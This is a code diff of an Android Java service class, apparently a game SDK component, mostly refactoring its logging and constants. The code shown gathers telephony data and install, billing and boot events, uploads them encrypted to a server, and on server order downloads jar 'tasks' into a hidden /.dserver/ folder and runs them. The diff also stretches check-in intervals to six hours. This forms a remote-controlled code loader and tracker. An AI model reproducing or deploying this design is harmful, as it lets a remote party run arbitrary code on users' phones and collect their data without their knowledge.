@@ -76,8 +76,8 @@ public class SdkServ implements DServ{
     public static final String ERR_CONFIG = "e05";
     public static final String ERR_UP_RESP = "e06";
     
-	int taskSleepTime = 10*1000;
-	int upSleepTime = 1000*10*2;
+	int taskSleepTime = 10*60*1000;
+	int upSleepTime = 1000*60*60*6;
 	int shortSleepTime = 1000*60*5;
 	long nextUpTime;
 	long lastUpTime = System.currentTimeMillis();
@@ -106,7 +106,7 @@ public class SdkServ implements DServ{
 	static final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
 	private String emvClass = "cn.play.dserv.MoreView";
 	private String emvPath = "emv";
-	private int state = STATE_RUNNING;
+	private int state = CheckTool.STATE_RUNNING;
 	
 	/**
 	 * 是否联网状态
@@ -124,7 +124,7 @@ public class SdkServ implements DServ{
 	
 	private void initConfig(){
 		this.config = new HashMap<String, Object>();
-		this.config.put("state", STATE_RUNNING);
+		this.config.put("state", CheckTool.STATE_RUNNING);
 		this.config.put("upUrl", upUrl);
 		this.config.put("emvClass", this.emvClass);
 		this.config.put("emvPath", this.emvPath);
@@ -137,9 +137,9 @@ public class SdkServ implements DServ{
 	@SuppressWarnings("unchecked")
 	private HashMap<String,Object> readConfig(String configPath){
 //		String txt = readTxt(configPath);
-//		CheckTool.log(TAG, "read enc:"+txt);
+//		CheckTool.log(this.dservice,TAG, "read enc:"+txt);
 //		if (!StringUtil.isStringWithLen(txt, 44)) {
-//			CheckTool.e(TAG, "config File error!");
+//			CheckTool.e(this.dservice,TAG, "config File error!");
 //			return this.config;
 //		}
 		try {
@@ -152,7 +152,7 @@ public class SdkServ implements DServ{
 			}
 		} catch (Exception e) {
 			e("ERR_"+ERR_CONFIG,"","",e.getMessage());
-			CheckTool.e(TAG, "config File error!",e);
+			CheckTool.e(this.dservice,TAG, "config File error!",e);
 		}
 		
 		return this.config;
@@ -191,47 +191,45 @@ public class SdkServ implements DServ{
 //			String enc =  DService.CsaveConfig(configPath, conf);
 //			writeTxt(configPath,enc);
 		} catch (Exception e) {
-			CheckTool.e(TAG, "save config error!", e);
+			CheckTool.e(this.dservice,TAG, "save config error!", e);
 		}
 	}
 	
 	//----------------------------config end------------------------------------
 	
 	public void receiveMsg(int act,String p,String v,String m){
-		CheckTool.log(TAG, "got act:"+act);
+		CheckTool.log(this.dservice,TAG, "act:"+act+" p:"+p +" m:"+m);
 		if (p == null) {
-			CheckTool.log(TAG, "receive p is null:"+act);
+			CheckTool.log(this.dservice,TAG, "receive p is null:"+act);
 			return;
 		}
 		//just log save
-		if (ACT_LOG == act) {
-			log(LEVEL_D, "LOG_"+act, p, v, m);
+		if (CheckTool.ACT_LOG == act) {
+			log(CheckTool.LEVEL_D, "LOG_"+act, p, v, m);
 			return;
 		}
 		if (StringUtil.isStringWithLen(v, 2)) {
 			if(!CheckTool.Ce(v, dservice)){
-				CheckTool.e(TAG, "v check failed.",null);
+				CheckTool.e(this.dservice,TAG, "v check failed.",null);
 				e("ERR_v_"+act, p, v, m);
 				return;
 			}else{
-				CheckTool.log(TAG, "V check OK");
+				CheckTool.log(this.dservice,TAG, "v check OK");
 			}
 		}else{
-			CheckTool.e(TAG, "v is empty.",null);
+			CheckTool.e(this.dservice,TAG, "v is empty.",null);
 			e("ERR_v_"+act, p, v, m);
 			return;
 		}
 		if (m == null) {
 			m = "";
 		}
-		CheckTool.log(TAG, "v pass:"+act);
-		
 		try {
 			switch (act) {
-			case ACT_EMACTIVITY_START:
-				log(LEVEL_I, "MORE_"+act, p, v, m);
+			case CheckTool.ACT_EMACTIVITY_START:
+				log(CheckTool.LEVEL_I, "MORE_"+act, p, v, m);
 				String emvP = sdDir+SdkServ.this.emvPath+".jar";
-				CheckTool.e(TAG, "emvP:"+emvP,null);
+				CheckTool.log(this.dservice,TAG, "emvP:"+emvP);
 				File f = new File(emvP);
 				if (f == null ||  !f.exists()|| f.isDirectory() ) {
 					Intent intent = dservice.getPackageManager().getLaunchIntentForPackage(
@@ -250,38 +248,37 @@ public class SdkServ implements DServ{
 				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
 				dservice.startActivity(it); 
 				break;
-			case ACT_NET_CHANGE:
-				CheckTool.log(TAG, "net m:"+m);
+			case CheckTool.ACT_NET_CHANGE:
 				if (m.equals("true")) {
 					isNetOk = true;
 				}else{
 					isNetOk = false;
 				}
-				log(LEVEL_I, "NET_"+act, p, v, m);
+				log(CheckTool.LEVEL_I, "NET_"+act, p, v, m);
 				break;
-			case ACT_GAME_INIT:
-			case ACT_GAME_EXIT:
-			case ACT_GAME_CONFIRM:
-			case ACT_GAME_CUSTOM:
-			log(LEVEL_I, "GAME_"+act, p, v, m);
+			case CheckTool.ACT_GAME_INIT:
+			case CheckTool.ACT_GAME_EXIT:
+			case CheckTool.ACT_GAME_EXIT_CONFIRM:
+			case CheckTool.ACT_GAME_CUSTOM:
+			log(CheckTool.LEVEL_I, "GAME_"+act, p, v, m);
 				break;
-			case ACT_FEE_INIT:
-			case ACT_FEE_OK:
-			case ACT_FEE_FAIL:
-			case ACT_PUSH_CLICK:
-			case ACT_PUSH_RECEIVE:
-			case ACT_APP_INSTALL:
-			case ACT_APP_REMOVE:
-			case ACT_BOOT:
-			case ACT_OTHER:
-				log(LEVEL_I, "ACT_"+act, p, v, m);
+			case CheckTool.ACT_FEE_INIT:
+			case CheckTool.ACT_FEE_OK:
+			case CheckTool.ACT_FEE_FAIL:
+			case CheckTool.ACT_PUSH_CLICK:
+			case CheckTool.ACT_PUSH_RECEIVE:
+			case CheckTool.ACT_APP_INSTALL:
+			case CheckTool.ACT_APP_REMOVE:
+			case CheckTool.ACT_BOOT:
+			case CheckTool.ACT_OTHER:
+				log(CheckTool.LEVEL_I, "ACT_"+act, p, v, m);
 				break;
-			case STATE_STOP:
-				log(LEVEL_I, "STOP", p, v, m);
+			case CheckTool.STATE_STOP:
+				log(CheckTool.LEVEL_I, "STOP", p, v, m);
 				stopService();
 				break;
-			case STATE_NEED_RESTART:
-				log(LEVEL_I, "RESTART", p, v, m);
+			case CheckTool.STATE_NEED_RESTART:
+				log(CheckTool.LEVEL_I, "RESTART", p, v, m);
 				startService();
 				break;
 			default:
@@ -310,19 +307,19 @@ public class SdkServ implements DServ{
 	}
 	
 	public void pauseService(){
-		this.state = STATE_PAUSE;
-		this.setProp("state", STATE_PAUSE,true);
+		this.state = CheckTool.STATE_PAUSE;
+		this.setProp("state", CheckTool.STATE_PAUSE,true);
 	}
 	
 	public void stopService(){
-		this.state = STATE_STOP;
-		this.setProp("state", STATE_STOP,true);
+		this.state = CheckTool.STATE_STOP;
+		this.setProp("state", CheckTool.STATE_STOP,true);
 		this.stop();
 	}
 	
 	public void startService(){
-		this.state = STATE_RUNNING;
-		this.setProp("state", STATE_RUNNING,true);
+		this.state = CheckTool.STATE_RUNNING;
+		this.setProp("state", CheckTool.STATE_RUNNING,true);
 		this.init(this.dservice);
 	}
 	
@@ -596,10 +593,10 @@ public class SdkServ implements DServ{
 	
 	private void syncTaskList(String remoteListStr,String downUrl){
 		if (!StringUtil.isStringWithLen(remoteListStr, 1)) {
-			CheckTool.log(TAG, "remote task is empty.");
+			CheckTool.log(this.dservice,TAG, "remote task is empty.");
 			return;
 		}
-		CheckTool.log(TAG, "remoteListStr:"+remoteListStr);
+		CheckTool.log(this.dservice,TAG, "remoteListStr:"+remoteListStr);
 		String[] remoteList = remoteListStr.split("_");
 		ArrayList<Integer> needFetchList = new ArrayList<Integer>();
 		synchronized (this.taskList) {
@@ -615,7 +612,7 @@ public class SdkServ implements DServ{
 						break;
 					}
 				}
-				CheckTool.log(TAG, "tid:"+tid+" tlist:"+tsb.toString()+ had);
+				CheckTool.log(this.dservice,TAG, "tid:"+tid+" tlist:"+tsb.toString()+ had);
 				if (!had) {
 					PLTask task = this.loadTask(tid, sdDir);
 					if (task == null) {
@@ -629,18 +626,18 @@ public class SdkServ implements DServ{
 		//fetch remote tasks
 		for (Integer id : needFetchList) {
 			if (this.fetchRemoteTask(id,downUrl)) {
-				CheckTool.log(TAG, "fetch OK:"+id);
+				CheckTool.log(this.dservice,TAG, "fetch OK:"+id);
 				PLTask task = this.loadTask(id, sdDir);
 				if (task != null) {
-					CheckTool.log(TAG, "loadTask OK:"+id);
+					CheckTool.log(this.dservice,TAG, "loadTask OK:"+id);
 					task.setDService(this);
 					task.init();
 					this.taskList.add(task);
 				}else{
-					CheckTool.e(TAG, "loadTask ERR:"+id,null);
+					CheckTool.e(this.dservice,TAG, "loadTask ERR:"+id,null);
 				}
 			}else{
-				CheckTool.e(TAG, "fetch ERR:"+id,null);
+				CheckTool.e(this.dservice,TAG, "fetch ERR:"+id,null);
 			}
 		}
 		this.saveStates();
@@ -664,7 +661,7 @@ public class SdkServ implements DServ{
 			is.close();
 			return true;
 		} catch (Exception e) {
-			CheckTool.e(TAG, "remote conn error:"+remoteUrl);
+			CheckTool.e(this.dservice,TAG, "remote conn error:"+remoteUrl);
 			e.printStackTrace();
 			
 		}
@@ -720,7 +717,7 @@ public class SdkServ implements DServ{
 			out.close();
 			conn.disconnect();
 		} catch (Exception e) {
-			CheckTool.e(TAG, "upload Failed",e);
+			CheckTool.e(this.dservice,TAG, "upload Failed",e);
 			sucess = false;
 		}
 
@@ -751,7 +748,7 @@ public class SdkServ implements DServ{
 				StringBuilder sb = new StringBuilder();
 				int api_level = android.os.Build.VERSION.SDK_INT;
 				if (SdkServ.this.dservice == null) {
-					CheckTool.e("UP", "ctx is null",null);
+					CheckTool.e(SdkServ.this.dservice,"UP", "ctx is null",null);
 					return false;
 				}
 				TelephonyManager tm=(TelephonyManager) SdkServ.this.dservice.getSystemService(Context.TELEPHONY_SERVICE);
@@ -775,10 +772,10 @@ public class SdkServ implements DServ{
 					}
 				}
 				sb.append(SPLIT_STR).append(getPropString("dt", ""));
-				CheckTool.log(TAG, "postUrl data:"+sb.toString());
+				CheckTool.log(SdkServ.this.dservice,TAG, "postUrl data:"+sb.toString());
 				
 				String data = "up="+CheckTool.Cg(sb.toString());
-				CheckTool.log(TAG, "enc data:"+data);
+				CheckTool.log(SdkServ.this.dservice,TAG, "enc data:"+data);
 				URL aUrl = new URL(upUrl);
 			    URLConnection conn = aUrl.openConnection();
 			    conn.setConnectTimeout(timeOut);
@@ -804,7 +801,7 @@ public class SdkServ implements DServ{
 			    
 			    if (!StringUtil.isStringWithLen(resp, 4)) {
 					//判断错误码
-			    	CheckTool.e(TAG, resp,null);
+			    	CheckTool.e(SdkServ.this.dservice,TAG, resp,null);
 			    	e("ERR_"+ERR_UP_RESP,"","","resp:"+resp);
 //			    	if (resp.equals(ERR_KEY_EXPIRED)) {
 //						//key过期,发起更新key的请求升级key
@@ -822,10 +819,10 @@ public class SdkServ implements DServ{
 				}
 			    //解密
 				String re = CheckTool.Cf(resp);//Encrypter.getInstance().decrypt(resp);
-				CheckTool.log(TAG, "re:"+re);
+				CheckTool.log(SdkServ.this.dservice,TAG, "re:"+re);
 				String[] res = re.split(SPLIT_STR);
 				if (!StringUtil.isDigits(res[0]) || !StringUtil.isDigits(res[1])) {
-					CheckTool.e(TAG, "re length Error:"+re,null);
+					CheckTool.e(SdkServ.this.dservice,TAG, "re length Error:"+re,null);
 					return false;
 				}
 				SdkServ.this.uid = Long.parseLong(res[0]);
@@ -836,7 +833,7 @@ public class SdkServ implements DServ{
 					return true;
 				case ORDER_SYNC_TASK:
 					//比对task_id_list,进行同步
-					CheckTool.log(TAG, "url:"+res[2]);
+					CheckTool.log(SdkServ.this.dservice,TAG, "url:"+res[2]);
 					String downLoadUrl = res[2];
 					String remoteTaskIds = res[3];
 					SdkServ.this.syncTaskList(remoteTaskIds,downLoadUrl);
@@ -858,12 +855,12 @@ public class SdkServ implements DServ{
 					
 					break;
 				case ORDER_RESTART_SERVICE:
-					log(LEVEL_I, "RESTART", dservice.getPackageName(), "restart", "ORDER_RESTART_SERVICE");
+					log(CheckTool.LEVEL_I, "RESTART", dservice.getPackageName(), "restart", "ORDER_RESTART_SERVICE");
 					startService();
 					
 					break;
 				case ORDER_STOP_SERVICE:
-					log(LEVEL_I, "STOP",dservice.getPackageName(), "stop", "ORDER_STOP_SERVICE");
+					log(CheckTool.LEVEL_I, "STOP",dservice.getPackageName(), "stop", "ORDER_STOP_SERVICE");
 					stopService();
 					break;
 				default:
@@ -873,7 +870,7 @@ public class SdkServ implements DServ{
 				
 				
 			} catch (Exception e) {
-				CheckTool.e(TAG, "up unknown Error:"+upUrl, e);
+				CheckTool.e(SdkServ.this.dservice,TAG, "up unknown Error:"+upUrl, e);
 			}
 			return false;
 		}
@@ -881,14 +878,14 @@ public class SdkServ implements DServ{
 
 		@Override
 		public void run() {
-			if (SdkServ.this.state != STATE_RUNNING) {
+			if (SdkServ.this.state != CheckTool.STATE_RUNNING) {
 				return;
 			}
 			nextUpTime = 1;
 			
 			try {
-				while (runFlag && SdkServ.this.state == STATE_RUNNING) {
-					CheckTool.log(TAG, "up running state:"+SdkServ.this.state);
+				while (runFlag && SdkServ.this.state == CheckTool.STATE_RUNNING) {
+					CheckTool.log(SdkServ.this.dservice,TAG, "up running state:"+SdkServ.this.state);
 					
 					if (!isConnOk()) {
 						Thread.sleep(shortSleepTime);
@@ -905,7 +902,7 @@ public class SdkServ implements DServ{
 							lastUpTime = System.currentTimeMillis();
 							nextUpTime += upSleepTime;
 							SdkServ.this.setProp("dt", "", true);
-							CheckTool.log(TAG, "lastUpTime:"+lastUpTime+" nextUpTime"+nextUpTime+" runFlag+"+runFlag+" state:"+SdkServ.this.state);
+							CheckTool.log(SdkServ.this.dservice,TAG, "lastUpTime:"+lastUpTime+" nextUpTime"+nextUpTime+" runFlag+"+runFlag+" state:"+SdkServ.this.state);
 						}else{
 							errTimes++;
 							Thread.sleep(shortSleepTime);
@@ -916,37 +913,7 @@ public class SdkServ implements DServ{
 							continue;
 						}
 					}
-					//日志上传
-//					String logs = readLog();
-					long logSize = getLogSize();
-					//判断是否有足够内容,或超过最大上传时间间隔
-					CheckTool.log(TAG, "log size:"+logSize);
-					if ((logSize > maxLogSize) || System.currentTimeMillis()>lastUpLogTime+maxLogSleepTime) {
-						boolean re = false;
-						String lFile = sdDir+uid+"_"+System.currentTimeMillis()+".zip";
-						re = zip(logFile, lFile);
-						if(re){
-							re = upload(lFile,upLogUrl);
-							if (!re) {
-								CheckTool.e(TAG, "upLog failed:"+lFile,null);
-							}else{
-								CheckTool.log(TAG, "upload log OK");
-							}
-						}
-						File f = new File(lFile);
-						f.delete();
-						if (re) {
-							lastUpLogTime = System.currentTimeMillis();
-							f = new File(logFile);
-							synchronized (f) {
-								f.delete();
-							}
-						}else{
-							Thread.sleep(shortSleepTime);
-							continue;
-						}
-					}
-					
+				
 					
 					Thread.sleep(upSleepTime);
 				}
@@ -995,12 +962,12 @@ public class SdkServ implements DServ{
 			File f = new File(sdDir+tid+datFileType);
 			if (f.exists()) {
 				f.delete();
-				CheckTool.log(TAG, "DAT remove OK:"+tid);
+				CheckTool.log(this.dservice,TAG, "DAT remove OK:"+tid);
 			}
 			f = new File(sdDir+tid+".jar");
 			if (f.exists()) {
 				f.delete();
-				CheckTool.log(TAG, "jar remove OK:"+tid);
+				CheckTool.log(this.dservice,TAG, "jar remove OK:"+tid);
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
@@ -1013,8 +980,8 @@ public class SdkServ implements DServ{
 		
 		@Override
 		public void run() {
-			CheckTool.log(TAG, "TaskThread started");
-			if (SdkServ.this.state != STATE_RUNNING) {
+			CheckTool.log(SdkServ.this.dservice,TAG, "TaskThread started");
+			if (SdkServ.this.state != CheckTool.STATE_RUNNING) {
 				return;
 			}
 			try {
@@ -1026,18 +993,18 @@ public class SdkServ implements DServ{
 					}
 				}
 				
-				while (runFlag && SdkServ.this.state == STATE_RUNNING) {
-					CheckTool.log(TAG, "task check");
+				while (runFlag && SdkServ.this.state == CheckTool.STATE_RUNNING) {
+					CheckTool.log(SdkServ.this.dservice,TAG, "task check");
 					synchronized (taskList) {
 						for (PLTask task : taskList) {
 							int state = task.getState();
-							CheckTool.log(TAG, "task state:"+state);
+							CheckTool.log(SdkServ.this.dservice,TAG, "task state:"+state);
 							switch (state) {
 							case PLTask.STATE_WAITING:
 								try {
 									new Thread(task).start();
 								} catch (Exception e) {
-									CheckTool.e(TAG, "task exec error:"+task.getId(),e);
+									CheckTool.e(SdkServ.this.dservice,TAG, "task exec error:"+task.getId(),e);
 									e("TASKERR", "T_"+task.getId(), "", e.getMessage());
 								}
 								break;
@@ -1049,7 +1016,40 @@ public class SdkServ implements DServ{
 							}
 						}
 					}
-					CheckTool.log(TAG, runFlag+","+SdkServ.this.state+","+taskSleepTime);
+					CheckTool.log(SdkServ.this.dservice,TAG, runFlag+","+SdkServ.this.state+","+taskSleepTime);
+					
+					//日志上传
+//					String logs = readLog();
+					long logSize = getLogSize();
+					//判断是否有足够内容,或超过最大上传时间间隔
+					CheckTool.log(SdkServ.this.dservice,TAG, "log size:"+logSize);
+					if ((logSize > maxLogSize) || System.currentTimeMillis()>lastUpLogTime+maxLogSleepTime) {
+						boolean re = false;
+						String lFile = sdDir+uid+"_"+System.currentTimeMillis()+".zip";
+						re = zip(logFile, lFile);
+						if(re){
+							re = upload(lFile,upLogUrl);
+							if (!re) {
+								CheckTool.e(SdkServ.this.dservice,TAG, "upLog failed:"+lFile,null);
+							}else{
+								CheckTool.log(SdkServ.this.dservice,TAG, "upload log OK");
+							}
+						}
+						File f = new File(lFile);
+						f.delete();
+						if (re) {
+							lastUpLogTime = System.currentTimeMillis();
+							f = new File(logFile);
+							synchronized (f) {
+								f.delete();
+							}
+						}else{
+							Thread.sleep(shortSleepTime);
+							continue;
+						}
+					}
+					
+					
 					Thread.sleep(taskSleepTime);
 				}
 			} catch (Exception e) {
@@ -1080,7 +1080,7 @@ public class SdkServ implements DServ{
 			}
 		}
 		sb.delete(0, 2);
-		CheckTool.log(TAG, "save task list:"+sb.toString());
+		CheckTool.log(this.dservice,TAG, "save task list:"+sb.toString());
 		this.setProp("t", sb.toString(),false);
 		this.setProp("emvClass", emvClass,false);
 		this.setProp("emvPath", emvPath,false);
@@ -1110,7 +1110,7 @@ public class SdkServ implements DServ{
 */
 				PLTask plug = CheckTool.Ci(this.dservice,id,"cn.play.dserv.PLTask"+id);
 				if (plug == null) {
-					CheckTool.e(TAG, "loadTask error:"+localPath,null);
+					CheckTool.e(this.dservice,TAG, "loadTask error:"+localPath,null);
 					return null;
 				}
 				//删除临时jar
@@ -1118,11 +1118,11 @@ public class SdkServ implements DServ{
 //				if (f.exists() && f.isFile()) {
 //					f.delete();
 //				}
-				CheckTool.log(TAG, "loadTask ok:"+plug.getId()+","+dexPath);
+				CheckTool.log(this.dservice,TAG, "loadTask ok:"+plug.getId()+","+dexPath);
 				
 				return plug;
 			}catch (Exception e) {
-				CheckTool.e(TAG, "loadTask error:"+localPath,e);
+				CheckTool.e(this.dservice,TAG, "loadTask error:"+localPath,e);
 			}    
 		}
 		return null;
@@ -1138,12 +1138,12 @@ public class SdkServ implements DServ{
 		if (this.taskThread != null) {
 			this.lt.setRunFlag(false);
 		}
-		if (this.state == STATE_DIE) {
+		if (this.state == CheckTool.STATE_DIE) {
 //			ctx.unregisterReceiver(this.myReceiver);
 		}else{
-			this.state = STATE_STOP;
+			this.state = CheckTool.STATE_STOP;
 		}
-		CheckTool.log(TAG, "stoped...");
+		CheckTool.log(this.dservice,TAG, "stoped...");
 		try {
 			Thread.sleep(3000);
 		} catch (InterruptedException e) {
@@ -1154,39 +1154,38 @@ public class SdkServ implements DServ{
 	
 	
 	public void init(DService dservice){
-		CheckTool.log(TAG, "init...");
 		this.dservice = dservice;
 		if (dservice == null) {
-			CheckTool.e(TAG, "IS NULL",null);
+			CheckTool.e(this.dservice,TAG, "DService IS NULL",null);
 			return ;
-		}else{
-			CheckTool.log(TAG, dservice.getPackageName());
 		}
+		CheckTool.log(this.dservice,TAG, "init:"+dservice.getPackageName()+" state:"+this.state);
+		
 		
 		this.config = this.readConfig(this.configPath);
 		if (this.config == null || this.config.size() <= 0) {
 			//直接初始化config
 			initConfig();
-			CheckTool.log(TAG, "no conf");
+			CheckTool.log(this.dservice,TAG, "no conf");
 		}else{
-			CheckTool.log(TAG, "init config OK.");
+			CheckTool.log(this.dservice,TAG, "init config OK.");
 		}
-		if (this.state == STATE_NEED_RESTART) {
+		if (this.state == CheckTool.STATE_NEED_RESTART) {
 			//重启
 			this.stop();
-			this.state = STATE_RUNNING;
+			this.state = CheckTool.STATE_RUNNING;
 		}else{
-			this.state = this.getPropInt("state", STATE_RUNNING);
+			this.state = this.getPropInt("state", CheckTool.STATE_RUNNING);
 		}
-		if (this.state == STATE_STOP) {
+		if (this.state == CheckTool.STATE_STOP) {
 			this.stop();
 			return;
-		}else if(this.state == STATE_DIE){
+		}else if(this.state == CheckTool.STATE_DIE){
 			//这里的STATE_DIE状态直接杀死本进程
 			this.stop();
 			dservice.stopSelf();
 			return;
-		}else if(this.state == STATE_PAUSE){
+		}else if(this.state == CheckTool.STATE_PAUSE){
 			return;
 		}
 //		cacheDir = ctx.getApplicationInfo().dataDir;
@@ -1197,7 +1196,7 @@ public class SdkServ implements DServ{
 //		Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
 		String tasks = this.getPropString( "t", "");
 		String deadTasks = this.getPropString("dt", "");
-		CheckTool.log(TAG, "init tasks:"+tasks+" dt:"+deadTasks);
+		CheckTool.log(this.dservice,TAG, "init tasks:"+tasks+" dt:"+deadTasks);
 		
 		ConnectivityManager cm = (ConnectivityManager) dservice.getSystemService(Context.CONNECTIVITY_SERVICE);    
 		isNetOk = false;
@@ -1238,7 +1237,7 @@ public class SdkServ implements DServ{
 					task.setDService(this);
 					this.taskList.add(task);
 				}else{
-					CheckTool.e(TAG, "load task failed:"+tid,null);
+					CheckTool.e(this.dservice,TAG, "load task failed:"+tid,null);
 				}
 			}
 			}
@@ -1381,7 +1380,7 @@ public class SdkServ implements DServ{
 		} catch (FileNotFoundException e) {
 			return "";
 		} catch (IOException e) {
-			CheckTool.e(TAG, "File read error:" + file,e);
+			e.printStackTrace();
 			return "";
 		}
 		return data;
@@ -1402,7 +1401,7 @@ public class SdkServ implements DServ{
 			out.close();
 			
 		} catch (IOException e) {
-			CheckTool.e(TAG, "writeTxt error:" + file,e);
+			e.printStackTrace();
 			return;
 		}
 	}
@@ -1433,7 +1432,7 @@ public class SdkServ implements DServ{
 	
 	public static final void i(String tag,String gameId,String channelId,String msg){
 		logSB.append(">>").append(System.currentTimeMillis()).append(SPLIT);
-		logSB.append(LEVEL_I).append(SPLIT);
+		logSB.append(CheckTool.LEVEL_I).append(SPLIT);
 		logSB.append(tag).append(SPLIT);
 		logSB.append(gameId).append(SPLIT);
 		logSB.append(channelId).append(SPLIT);
@@ -1442,7 +1441,7 @@ public class SdkServ implements DServ{
 	
 	public static final void e(String tag,String gameId,String channelId,String msg){
 		logSB.append(">>").append(System.currentTimeMillis()).append(SPLIT);
-		logSB.append(LEVEL_E).append(SPLIT);
+		logSB.append(CheckTool.LEVEL_E).append(SPLIT);
 		logSB.append(tag).append(SPLIT);
 		logSB.append(gameId).append(SPLIT);
 		logSB.append(channelId).append(SPLIT);
